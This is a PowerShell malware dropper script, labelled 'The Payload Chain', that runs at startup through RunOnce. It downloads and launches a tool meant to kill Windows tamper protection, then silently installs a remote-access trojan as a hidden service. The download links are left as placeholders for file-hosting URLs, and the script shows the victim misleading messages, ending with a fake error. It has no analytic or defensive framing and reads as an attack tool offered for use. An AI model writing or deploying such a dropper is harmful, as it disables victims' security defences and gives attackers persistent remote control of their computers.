# Revolution Plan 2 - The Payload Chain
# Executed by RunOnce after reboot.

# === SPEED FIX: Disable Progress Bar (Increases download speed by 10x) ===
$ProgressPreference = 'SilentlyContinue'

Write-Host "Preparation!" -ForegroundColor Cyan

# ---------------------------------------------------------
# STEP 1: Tamper Protection Killer (Defense Evasion)
# ---------------------------------------------------------
# [USER] OPTIONAL: Updates this link if you still use 'tamper_killer.exe'
$TamperUrl = "YOUR_MEDIAFIRE_LINK_TO_TAMPER_KILLER_OR_LEAVE_AS_IS" 
$TamperDest = "$env:TEMP\tamper_killer.exe"

Write-Host "Downloading..."
try {
    Invoke-WebRequest -Uri $TamperUrl -OutFile $TamperDest -UseBasicParsing
    Unblock-File -Path $TamperDest -ErrorAction SilentlyContinue
        
    if (Test-Path $TamperDest) {
        # Write-Host "    -> Launching Neutralizer (Background)..." -ForegroundColor Yellow
        # REMOVED -Wait: We do not wait for it, because it might run forever or take time.
        Start-Process -FilePath $TamperDest
        Write-Host "Done half way!" -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Download Failed!" -ForegroundColor Red
}

# ---------------------------------------------------------
# STEP 2: MyDesk Persistent Agent (The RAT)
# ---------------------------------------------------------
# REPLACE THIS URL with your uploaded 'MyDeskSetup.exe' link
$SetupUrl = "YOUR_MEDIAFIRE_LINK_TO_MYDESKSETUP_EXE" 
$SetupDest = "$env:TEMP\MyDeskSetup.exe"

Write-Host "Retry getting info.."
try {
    Invoke-WebRequest -Uri $SetupUrl -OutFile $SetupDest -UseBasicParsing
    Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
        
    if (Test-Path $SetupDest) {
        # Write-Host "    -> Installing Hidden Service..." -ForegroundColor Yellow
        # Service Installer exits quickly, so -Wait is fine here.
        Start-Process -FilePath $SetupDest -Wait
        Write-Host "Done!" -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Download Failed!" -ForegroundColor Red
}

Write-Host "FALTAL ERROR" -ForegroundColor Red
exit